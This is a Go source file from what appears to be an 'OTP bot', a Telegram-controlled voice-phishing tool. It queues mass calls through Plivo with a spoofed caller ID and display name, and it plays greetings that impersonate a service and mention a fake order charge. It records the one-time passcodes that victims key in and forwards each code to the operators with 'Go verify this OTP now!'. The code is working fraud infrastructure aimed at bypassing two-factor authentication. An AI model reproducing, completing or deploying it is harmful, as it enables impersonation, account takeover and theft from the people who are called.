package bot

import (
	"fmt"
	"log"
	"strings"
	"time"

	"github.com/USERNAME/goland-otpbot-api/config"
	"github.com/USERNAME/goland-otpbot-api/voice"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

func (b *Bot) processCallQueue() {
	cfg, err := config.Get()
	if err != nil {
		log.Printf("Failed to get config in processCallQueue: %v", err)
		return
	}
	concurrency := cfg.Concurrency
	if concurrency <= 0 {
		concurrency = 5
	}

	sem := make(chan struct{}, concurrency)

	for {
		select {
		case <-b.stopChan:
			return
		case job := <-b.callQueue:
			sem <- struct{}{}
			go func(j CallJob) {
				defer func() { <-sem }()
				b.processCall(j)
			}(job)
		}
	}
}

func (b *Bot) processCall(job CallJob) {
	cfg, err := config.Get()
	if err != nil {
		log.Printf("Failed to get config in processCall: %v", err)
		return
	}

	campaign, err := b.db.GetCampaign(job.CampaignID)
	if err != nil {
		log.Printf("Failed to get campaign %d: %v", job.CampaignID, err)
		return
	}

	template, err := b.db.GetTemplate(campaign.Service)
	if err != nil {
		log.Printf("Failed to get template %s: %v", campaign.Service, err)
		return
	}

	// Generate dynamic template variables
	victimName := "Customer"
	amount := "$450.24"
	orderID := "ORD-" + fmt.Sprintf("%d", time.Now().Unix())

	// Replace template variables in greeting - STORE the result!
	greeting := b.replaceTemplateVars(template.Greeting, victimName, amount, orderID)
	// Note: Other prompts (action, otp, confirmation) are replaced in webhooks if needed
	
	// Build webhook URLs with proper trailing slash handling
	answerURL := buildWebhookURL(cfg.NgrokURL, "answer", job.CampaignID, job.CallID)
	ringURL := buildWebhookURL(cfg.NgrokURL, "ring", job.CampaignID, job.CallID)
	machineURL := buildWebhookURL(cfg.NgrokURL, "machine", job.CampaignID, job.CallID)
	errorURL := buildWebhookURL(cfg.NgrokURL, "error", job.CampaignID, job.CallID)

	// Use CallerID for spoofing - this is the number that shows up on victim's phone!
	callerID := cfg.CallerID
	if callerID == "" {
		callerID = cfg.PlivoNumber // fallback to Plivo number
	}

	callReq := voice.CallRequest{
		From:                callerID,
		To:                  job.Phone,
		AnswerURL:           answerURL,
		RingURL:             ringURL,
		MachineDetectionURL: machineURL,
		ErrorCallbackURL:    errorURL,
		TimeLimit:           cfg.CallTimeout,
		RingTimeout:         30,
		CallerName:          cfg.CallerName, // Optional display name on victim's phone
	}

	// Log with caller ID and name info
	callerInfo := callerID
	if cfg.CallerName != "" {
		callerInfo = fmt.Sprintf("%s (%s)", callerID, cfg.CallerName)
	}
	b.db.CreateLog("INFO", fmt.Sprintf("Initiating call: %s -> %s (Spoofed CallerID: %s)", callerInfo, job.Phone, callerInfo), "")

	resp, err := b.plivo.MakeCall(callReq)
	if err != nil {
		log.Printf("Failed to make call to %s: %v", job.Phone, err)
		b.db.UpdateCallStatus(job.CallID, "failed", "")
		b.db.IncrementCampaignStats(job.CampaignID)
		b.db.CreateLog("ERROR", fmt.Sprintf("Call failed to %s: %v", job.Phone, err), "")
		return
	}

	b.mu.Lock()
	b.activeCalls[resp.UUID] = &ActiveCall{
		CallID:     job.CallID,
		CampaignID: job.CampaignID,
		Phone:      job.Phone,
		UUID:       resp.UUID,
		Status:     "ringing",
		StartedAt:  time.Now(),
		Greeting:   greeting, // Store templated greeting for webhook
	}
	b.mu.Unlock()

	b.db.UpdateCallStatus(job.CallID, "ringing", resp.UUID)
	b.db.CreateLog("INFO", fmt.Sprintf("Call initiated to %s (UUID: %s, Spoofed CallerID: %s)", job.Phone, resp.UUID, callerInfo), "")
}

func (b *Bot) replaceTemplateVars(text, victimName, amount, orderID string) string {
	text = strings.ReplaceAll(text, "{{victim_name}}", victimName)
	text = strings.ReplaceAll(text, "{{amount}}", amount)
	text = strings.ReplaceAll(text, "{{order_id}}", orderID)
	return text
}

func (b *Bot) HandleRing(campaignID, callID int64) {
	b.db.UpdateCallStatus(callID, "ringing", "")
}

func (b *Bot) HandleAnswer(campaignID, callID int64) {
	b.db.UpdateCallStatus(callID, "answered", "")
	b.db.IncrementCampaignStats(campaignID)
}

func (b *Bot) HandleVoicemail(campaignID, callID int64) {
	b.db.UpdateCallStatus(callID, "voicemail", "")
	b.db.IncrementCampaignStats(campaignID)
	b.notifyCampaignUpdate(campaignID, "📬 Voicemail detected")
}

func (b *Bot) HandleHangup(campaignID, callID int64) {

	b.mu.Lock()
	for uuid, call := range b.activeCalls {
		if call.CallID == callID {
			delete(b.activeCalls, uuid)
			break
		}
	}
	b.mu.Unlock()

	if call, err := b.db.GetCall(callID); err == nil && call.StartedAt != nil {
		duration := int(time.Since(*call.StartedAt).Seconds())
		b.db.UpdateCallDuration(callID, duration)
	}

	b.db.UpdateCallStatus(callID, "completed", "")
	b.checkCampaignComplete(campaignID)
}

func (b *Bot) HandleDTMF(campaignID, callID int64, digits string) {
	if digits == "" {
		return
	}

	campaign, err := b.db.GetCampaign(campaignID)
	if err != nil {
		return
	}

	call, err := b.db.GetCall(callID)
	if err != nil {
		return
	}

	_, err = b.db.CreateCapture(callID, campaignID, call.Phone, digits, campaign.Service)
	if err != nil {
		log.Printf("Failed to save capture: %v", err)
		return
	}

	b.db.IncrementCampaignCaptures(campaignID)

	b.db.CreateLog("INFO", fmt.Sprintf("OTP CAPTURED from %s (Service: %s)", maskPhone(call.Phone), campaign.Service), "")
	b.db.CreateLog("DEBUG", fmt.Sprintf("OTP length: %d digits", len(digits)), "")

	b.notifyCapture(campaignID, call.Phone, digits, campaign.Service)
}

func (b *Bot) HandleError(campaignID, callID int64, errorMsg string) {
	b.db.UpdateCallStatus(callID, "failed", "")
	b.db.IncrementCampaignStats(campaignID)

	b.mu.Lock()
	for uuid, call := range b.activeCalls {
		if call.CallID == callID {
			delete(b.activeCalls, uuid)
			break
		}
	}
	b.mu.Unlock()

	b.db.CreateLog("ERROR", fmt.Sprintf("Call error for %d: %s", callID, errorMsg), "")
}

func (b *Bot) checkCampaignComplete(campaignID int64) {
	campaign, err := b.db.GetCampaign(campaignID)
	if err != nil {
		return
	}

	if campaign.Completed >= campaign.TotalCalls {
		b.db.CompleteCampaign(campaignID)

		b.mu.Lock()
		if state, ok := b.campaignState[campaignID]; ok {
			state.mu.Lock()
			state.Status = "completed"
			state.mu.Unlock()
		}
		// Clean up campaign state after completion
		delete(b.campaignState, campaignID)
		b.mu.Unlock()

		b.db.CreateLog("INFO", fmt.Sprintf("Campaign %d completed: %d/%d calls, %d captures",
			campaignID, campaign.Completed, campaign.TotalCalls, campaign.Captures), "")
	}
}

// getCampaignState safely retrieves campaign state with proper locking
func (b *Bot) getCampaignState(campaignID int64) (*CampaignState, bool) {
	b.mu.RLock()
	defer b.mu.RUnlock()
	state, ok := b.campaignState[campaignID]
	return state, ok
}

// setCampaignState safely sets campaign state with proper locking
func (b *Bot) setCampaignState(campaignID int64, state *CampaignState) {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.campaignState[campaignID] = state
}

// incrementCampaignIndex safely increments the campaign index
func (b *Bot) incrementCampaignIndex(campaignID int64) int {
	b.mu.Lock()
	defer b.mu.Unlock()
	
	if state, ok := b.campaignState[campaignID]; ok {
		state.mu.Lock()
		defer state.mu.Unlock()
		idx := state.index
		state.index++
		return idx
	}
	return -1
}

func (b *Bot) notifyCapture(campaignID int64, phone, otp, service string) {
	cfg, err := config.Get()
	if err != nil {
		log.Printf("Failed to get config in notifyCapture: %v", err)
		return
	}

	for _, adminID := range cfg.AdminIDs {
		text := fmt.Sprintf(`🎉 *OTP CAPTURED!* 🎉

━━━━━━━━━━━━━━━━━━━━
🏷️ Service: %s
📱 Victim: %s
━━━━━━━━━━━━━━━━━━━━
🔐 *OTP: %s*
━━━━━━━━━━━━━━━━━━━━
⏱️ Captured: %s

💰 Go verify this OTP now!
`, service, maskPhone(phone), otp, time.Now().Format("15:04:05"))

		b.sendMessage(adminID, text)
	}
}

func (b *Bot) notifyCampaignUpdate(campaignID int64, message string) {
	cfg, err := config.Get()
	if err != nil {
		log.Printf("Failed to get config in notifyCampaignUpdate: %v", err)
		return
	}

	for _, adminID := range cfg.AdminIDs {
		campaign, _ := b.db.GetCampaign(campaignID)
		if campaign == nil {
			continue
		}

		text := fmt.Sprintf("%s\n\nCampaign: %s (ID: %d)", message, campaign.Name, campaignID)
		b.sendMessage(adminID, text)
	}
}

func (b *Bot) HangupCall(uuid string) {
	b.mu.Lock()
	delete(b.activeCalls, uuid)
	b.mu.Unlock()

	b.plivo.HangupCall(uuid)
}

func (b *Bot) GetActiveCalls() int {
	b.mu.RLock()
	defer b.mu.RUnlock()
	return len(b.activeCalls)
}

func (b *Bot) addTemplate(msg *tgbotapi.Message) {
	parts := strings.Split(msg.CommandArguments(), "|")
	if len(parts) < 6 {
		b.sendMessage(msg.Chat.ID, "❌ Usage:\n/addtemplate name|voice|greeting|action_prompt|otp_prompt|confirmation\n\nExample:\n/addtemplate myservice|en-US-WOMAN|Hello.|Press 1.|Enter OTP.|Thank you.")
		return
	}

	name := strings.ToLower(strings.TrimSpace(parts[0]))
	voice := strings.TrimSpace(parts[1])
	if voice == "" {
		voice = "en-US-WOMAN"
	}
	greeting := strings.TrimSpace(parts[2])
	actionPrompt := strings.TrimSpace(parts[3])
	otpPrompt := strings.TrimSpace(parts[4])
	confirmation := strings.TrimSpace(parts[5])

	var fallback, holdMusic string
	if len(parts) > 6 {
		fallback = strings.TrimSpace(parts[6])
	}
	if len(parts) > 7 {
		holdMusic = strings.TrimSpace(parts[7])
	}

	if _, err := b.db.GetTemplate(name); err == nil {
		b.sendMessage(msg.Chat.ID, fmt.Sprintf("❌ Template '%s' already exists. Use /edittemplate to modify it.", name))
		return
	}

	_, err := b.db.CreateTemplate(name, voice, greeting, actionPrompt, otpPrompt, confirmation, fallback, holdMusic)
	if err != nil {
		b.sendMessage(msg.Chat.ID, fmt.Sprintf("❌ Failed to create template: %v", err))
		return
	}

	b.sendMessage(msg.Chat.ID, fmt.Sprintf("✅ Template '%s' created successfully!", name))
	b.db.CreateLog("INFO", fmt.Sprintf("Template '%s' created", name), "")
}

func (b *Bot) editTemplate(msg *tgbotapi.Message) {
	parts := strings.Split(msg.CommandArguments(), "|")
	if len(parts) < 7 {
		b.sendMessage(msg.Chat.ID, "❌ Usage:\n/edittemplate name|voice|greeting|action_prompt|otp_prompt|confirmation|fallback|holdmusic\n\nAll fields required.")
		return
	}

	name := strings.ToLower(strings.TrimSpace(parts[0]))
	voice := strings.TrimSpace(parts[1])
	greeting := strings.TrimSpace(parts[2])
	actionPrompt := strings.TrimSpace(parts[3])
	otpPrompt := strings.TrimSpace(parts[4])
	confirmation := strings.TrimSpace(parts[5])
	fallback := strings.TrimSpace(parts[6])
	holdMusic := ""
	if len(parts) > 7 {
		holdMusic = strings.TrimSpace(parts[7])
	}

	if _, err := b.db.GetTemplate(name); err != nil {
		b.sendMessage(msg.Chat.ID, fmt.Sprintf("❌ Template '%s' not found.", name))
		return
	}

	err := b.db.UpdateTemplate(name, voice, greeting, actionPrompt, otpPrompt, confirmation, fallback, holdMusic)
	if err != nil {
		b.sendMessage(msg.Chat.ID, fmt.Sprintf("❌ Failed to update template: %v", err))
		return
	}

	b.sendMessage(msg.Chat.ID, fmt.Sprintf("✅ Template '%s' updated successfully!", name))
	b.db.CreateLog("INFO", fmt.Sprintf("Template '%s' updated", name), "")
}

func (b *Bot) deleteTemplate(msg *tgbotapi.Message, name string) {
	if name == "" {
		b.sendMessage(msg.Chat.ID, "❌ Usage: /deltemplate <name>")
		return
	}

	name = strings.ToLower(strings.TrimSpace(name))

	if _, err := b.db.GetTemplate(name); err != nil {
		b.sendMessage(msg.Chat.ID, fmt.Sprintf("❌ Template '%s' not found.", name))
		return
	}

	if err := b.db.DeleteTemplate(name); err != nil {
		b.sendMessage(msg.Chat.ID, fmt.Sprintf("❌ Failed to delete template: %v", err))
		return
	}

	b.sendMessage(msg.Chat.ID, fmt.Sprintf("✅ Template '%s' deleted successfully!", name))
	b.db.CreateLog("INFO", fmt.Sprintf("Template '%s' deleted", name), "")
}
